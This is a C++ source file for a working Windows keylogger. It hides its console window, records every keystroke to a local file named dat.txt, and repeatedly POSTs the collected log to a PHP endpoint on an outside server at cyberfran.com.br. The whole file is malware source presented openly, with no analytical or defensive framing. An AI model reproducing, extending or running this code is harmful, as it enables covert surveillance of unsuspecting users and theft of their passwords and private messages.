#include <iostream>
#include <fstream>
#include <string>
#include <Windows.h>
#include <curl/curl.h>

using namespace std;

void LOG(string input)
{
    ofstream LogFile;
    LogFile.open("dat.txt", fstream::app);
    if (LogFile.is_open())
    {
        LogFile << input;
        LogFile.close();
    }
}

bool SpecialKeys(int S_Key)
{
    switch (S_Key)
    {
    case VK_SPACE:
        cout << " ";
        LOG(" ");
        return true;
    case VK_RETURN:
        cout << "\n";
        LOG("\n");
        return true;
    case VK_OEM_PERIOD:
        cout << ".";
        LOG(".");
        return true;
    case VK_OEM_7:
        cout << "'";
        LOG("'");
        return true;
    case VK_OEM_1:
        cout << ";";
        LOG(";");
        return true;
    case VK_OEM_COMMA:
        cout << ",";
        LOG(",");
        return true;
    case VK_OEM_PLUS:
        cout << "+";
        LOG("+");
        return true;
    case VK_OEM_MINUS:
        cout << "-";
        LOG("-");
        return true;
    case VK_OEM_2:
        cout << "/";
        LOG("/");
        return true;
    case VK_OEM_3:
        cout << "`";
        LOG("`");
        return true;
    case VK_OEM_5:
        cout << "\\";
        LOG("\\");
        return true;
    case VK_OEM_4:
        cout << "[";
        LOG("[");
        return true;
    case VK_OEM_6:
        cout << "]";
        LOG("]");
        return true;
    case VK_OEM_102:
        cout << "<";
        LOG("<");
        return true;
    case VK_OEM_8:
        cout << "~";
        LOG("~");
        return true;
    case VK_SHIFT:
        cout << "#SHIFT#";
        LOG("#SHIFT#");
        return true;
    case VK_BACK:
        cout << "\b";
        LOG("\b");
        return true;
    case VK_RBUTTON:
        cout << "#R_CLICK#";
        LOG("#R_CLICK#");
        return true;
    case VK_CAPITAL:
        cout << "#CAPS_LOCK#";
        LOG("#CAPS_LCOK");
        return true;
    case VK_TAB:
        cout << "#TAB";
        LOG("#TAB");
        return true;
    case VK_UP:
        cout << "#UP";
        LOG("#UP_ARROW_KEY");
        return true;
    case VK_DOWN:
        cout << "#DOWN";
        LOG("#DOWN_ARROW_KEY");
        return true;
    case VK_LEFT:
        cout << "#LEFT";
        LOG("#LEFT_ARROW_KEY");
        return true;
    case VK_RIGHT:
        cout << "#RIGHT";
        LOG("#RIGHT_ARROW_KEY");
        return true;
    case VK_CONTROL:
        cout << "#CONTROL";
        LOG("#CONTROL");
        return true;
    case VK_MENU:
        cout << "#ALT";
        LOG("#ALT");
        return true;
    default:
        return false;
    }
}

size_t WriteCallback(char *contents, size_t size, size_t nmemb, std::string *buffer)
{
    size_t totalSize = size * nmemb;
    buffer->append(contents, totalSize);
    return totalSize;
}

bool IsInternetAvailable()
{
    CURL *curl = curl_easy_init();
    if (curl)
    {
        std::string response;
        curl_easy_setopt(curl, CURLOPT_URL, "https://cyberfran.com.br/");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        CURLcode result = curl_easy_perform(curl);

        curl_easy_cleanup(curl);

        if (result == CURLE_OK)
        {
            // Verifica se a resposta contém conteúdo válido
            if (!response.empty())
            {
                return true;
            }
        }
    }

    return false;
}
void SendLogs(const std::string &logs)
{
    CURL *curl = curl_easy_init();
    if (curl)
    {
        std::string response;
        curl_easy_setopt(curl, CURLOPT_URL, "http://cyberfran.com.br/keylogger/logs.php");
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, ("logs=" + logs).c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        CURLcode result = curl_easy_perform(curl);

        curl_easy_cleanup(curl);

        if (result == CURLE_OK)
        {
            std::cout << "Logs enviados com sucesso." << std::endl;
            std::cout << "Resposta do servidor: " << response << std::endl;
        }
        else
        {
            std::cerr << "Erro ao enviar os logs: " << curl_easy_strerror(result) << std::endl;
        }
    }
    else
    {
        std::cerr << "Erro ao inicializar o cURL." << std::endl;
    }
}

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char KEY = 'x';

    while (true)
    {
        Sleep(10);
        for (int KEY = 8; KEY <= 190; KEY++)
        {
            if (GetAsyncKeyState(KEY) == -32767)
            {
                if (SpecialKeys(KEY) == false)
                {
                    ofstream LogFile;
                    LogFile.open("dat.txt", fstream::app);
                    if (LogFile.is_open())
                    {
                        LogFile << char(KEY);
                        LogFile.close();
                    }
                }
            }
        }
        if (IsInternetAvailable())
        {
            std::ifstream LogFile("dat.txt");
            std::string logs((std::istreambuf_iterator<char>(LogFile)), std::istreambuf_iterator<char>());
            LogFile.close();

            // Enviando os logs
            SendLogs(logs);
        }
    }

    return 0;
}
